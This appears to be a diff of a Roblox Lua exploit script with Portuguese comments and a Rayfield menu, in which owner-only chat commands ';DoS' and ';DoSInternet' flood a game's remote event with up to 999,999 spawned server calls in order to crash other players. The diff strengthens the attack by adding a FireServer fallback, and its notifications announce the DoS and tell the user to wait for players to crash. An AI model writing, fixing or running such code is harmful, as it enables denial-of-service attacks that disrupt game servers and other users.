@@ -425,34 +425,25 @@ local function OuvirChat(Jogador, Mensagem)
     -- 2. Comandos restritos estritamente ao seu ID de Dono
     if Jogador.UserId == ID_DONO then
         if Mensagem == ";DoS" then
-    -- Correção: Usando o padrão de nomenclatura unificado 'LocalPlayer'
     local LocalPlayer = game:GetService("Players").LocalPlayer
-    local replicatedStorage = game:GetService("ReplicatedStorage")
-    local starterGui = game:GetService("StarterGui")
-
     local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
     local rootpart = character:WaitForChild("HumanoidRootPart", 10)
     if not rootpart then return end
     local oldcf = rootpart.CFrame
 
-    local re = replicatedStorage:FindFirstChild("RE")
+    local re = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
     local toolRemote = re and re:FindFirstChild("1Too1l")
     if not toolRemote then return end
 
-    pcall(function() 
-        starterGui:SetCore("SendNotification", { 
-            Title = "Ataque DoS Iniciado", 
-            Text = "Aguarde os jogadores Crashar", 
-            Button1 = "Ok", 
-            Duration = 5 
-        }) 
-    end)
+    pcall(function() game:GetService("StarterGui"):SetCore("SendNotification", { Title = "Ataque DoS Iniciado", Text = "Aguarde os jogadores Crashar", Button1 = "Ok", Duration = 5 }) end)
 
     task.spawn(function()
         for m = 1, 999999 do
             task.spawn(function()
                 if toolRemote:IsA("RemoteFunction") then
                     toolRemote:InvokeServer("PickingTools", "FireHose")
+                else
+                    toolRemote:FireServer("PickingTools", "FireHose")
                 end
             end)
 
@@ -494,19 +485,10 @@ local function OuvirChat(Jogador, Mensagem)
         end
     end
 
-    Rayfield:Notify({ 
-        Title = "Painel Privado", 
-        Content = "Gatilho DoS (Normal) ativado com sucesso.", 
-        Duration = 4,
-        Image = 4483362458
-    })
-                end
-            
-    -- =============================================================================
--- VERIFICAÇÃO DO COMANDO: ;DoSInternet (CORRIGIDO PARA O CHAT)
--- =============================================================================
-if msg:match("^;DoSInternet$") then
-    -- Correção: Substituído 'Mensagem' por 'msg' (variável padrão do chat do Roblox)
+    Rayfield:Notify({ Title = "Painel Privado", Content = "Gatilho DoS (Normal) ativado.", Duration = 4, Image = 4483362458 })
+        end
+        
+if Mensagem == ";DoSInternet" then
     local LocalPlayer = game:GetService("Players").LocalPlayer
     local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() 
     local backpack = LocalPlayer:WaitForChild("Backpack") 
@@ -535,14 +517,9 @@ if msg:match("^;DoSInternet$") then
         end 
     end
 
-    Rayfield:Notify({ 
-        Title = "Painel Privado", 
-        Content = "Gatilho DoS (Internet) ativado com sucesso.", 
-        Duration = 4,
-        Image = 4483362458
-    })
-            end
-            
+    Rayfield:Notify({ Title = "Painel Privado", Content = "Gatilho DoS (Internet) ativado.", Duration = 4, Image = 4483362458 })
+        end
+        
 -- Variável de controle do loop de ataque (declarada fora do evento para consistência)
 local flingActive = false
 
